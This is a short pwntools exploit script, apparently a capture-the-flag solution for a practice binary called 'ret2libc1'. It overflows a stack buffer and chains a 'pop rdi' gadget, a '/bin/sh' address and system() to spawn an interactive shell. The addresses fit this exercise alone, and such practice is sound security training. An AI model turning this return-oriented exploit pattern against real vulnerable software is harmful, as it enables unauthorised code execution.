#coding=utf-8
from pwn import*
context(os='linux',arch='amd64')
context.log_level = 'debug'
#gdb.attach(p)
#pause()

p = process('./ret2libc1')
elf = ELF('./ret2libc1')

binsh_addr = 0x400744 
system = 0x400642
prdi_ret = 0x400723

payload  = 'A'*0x70 + p64(0)
payload += p64(prdi_ret) + p64(binsh_addr) + p64(system)

#gdb.attach(p)
#pause()
p.recvuntil("Please pwn me :)\n")
p.sendline(payload)
p.interactive()
